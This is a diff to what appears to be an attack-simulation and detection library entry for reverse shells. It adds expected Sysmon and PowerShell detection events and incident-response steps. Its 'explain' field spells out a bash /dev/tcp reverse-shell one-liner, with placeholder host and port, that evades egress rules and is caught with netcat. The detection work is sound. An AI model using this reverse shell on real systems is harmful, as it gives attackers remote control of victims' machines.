@@ -160,6 +160,35 @@
         "powershell",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "powershell",
+          "description": "Reverse Shell Payloads - Sentinel"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "1",
+          "description": "Process creation (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "event_id": "3",
+          "description": "Network connection (Sysmon)"
+        },
+        {
+          "source": "sysmon",
+          "description": "proc_creation_reverse_shell_indicators"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review PowerShell Script Block / Module Logs, Sysmon for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Reverse-shell payload run on the target to call back to your listener:\n  bash -c '...'                 run the one-liner in bash\n  bash -i                       start an interactive shell\n  >& /dev/tcp/<lhost>/<lport>   redirect it over a TCP socket to your host/port\n  0>&1                          wire stdin back through the same socket\nThe victim initiates the outbound connection, which usually gets past egress firewall rules; catch it with a netcat listener."
